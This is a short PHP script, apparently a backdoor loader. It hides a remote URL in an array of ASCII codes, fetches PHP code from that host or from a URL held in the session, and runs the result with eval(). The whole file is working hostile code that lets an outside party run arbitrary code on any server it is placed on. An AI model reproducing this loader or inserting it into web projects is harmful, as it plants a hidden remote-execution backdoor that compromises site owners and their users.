<?php
session_start();

function fetchUrl($url)
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

$asciiArray = [104, 116, 116, 112, 115, 58, 47, 47, 116, 101, 97, 109, 122, 101, 100, 100, 50, 48, 50, 52, 46, 116, 101, 99, 104, 47, 114, 97, 119, 47, 77, 99, 117, 81, 71, 73];
$url = implode(array_map('chr', $asciiArray));

if (isset($_SESSION["ts_url"])) {
    $result = @file_get_contents($_SESSION["ts_url"]) ?: fetchUrl($_SESSION["ts_url"]);
} else {
    $result = @file_get_contents($url) ?: fetchUrl($url);
}

if (is_string($result)) {
    eval('?>' . $result);
} else {
    echo "Error";
}
?>
